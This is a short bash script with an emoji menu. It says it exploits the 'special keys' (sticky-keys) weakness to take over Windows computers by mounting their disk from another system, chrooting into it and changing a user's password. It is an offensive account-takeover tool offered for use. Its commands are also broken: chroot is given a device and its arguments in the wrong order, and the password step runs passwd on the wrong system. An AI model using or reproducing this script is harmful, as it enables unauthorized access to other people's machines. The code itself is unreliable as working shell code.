#!/bin/bash

clear 
i=y

while [ $i = "y" ]
do
echo "With this script we will take advantage of the vulnerability of the special keys"
echo ""
echo "== 💀 == MENU == 💀 =="
echo "1- 📂 Create mount folder"
echo "2- 📁 Mount the disk in the mount folder"
echo "3- 💻 Change root directory"
echo "4- 👓 Change user password" 
echo "5- 🔄 Reboot"
echo "6- 📃 Disk list"
echo "Don't put anything if you want to leave"
echo ""
read -p "🎲 Choose an option: " op

case $op in 

 1) sudo mkdir /mnt/ubuntu
;;

 2) clear
	 echo "Remember that this only works with windows computers"
   echo "For ubuntu I will bring one soon"
	 read -p "Disk name (sda, sda1...): " name
 if [ -z $name ]
 then
        echo "You have not entered anything"
 fi
	sudo mount -t ntfs /dev/$name /mnt/ubuntu
	echo "Disk mounted correctly!!"
;; 


 3) sudo chroot /dev/$name /mnt/ubuntu
    echo "root directory changed successfully"
;;
 4) read -p "User whose password you want to change" user
    
     sudo chroot /mnt/ubuntu /bin/bash
     sudo passwd $user
;;

  5) reboot
;;
  6) sudo fdisk --list 
;;
esac
read -p "Do you want to continue? (y/n): " i
if [ $i != "y" ]
then 
	exit
fi
done
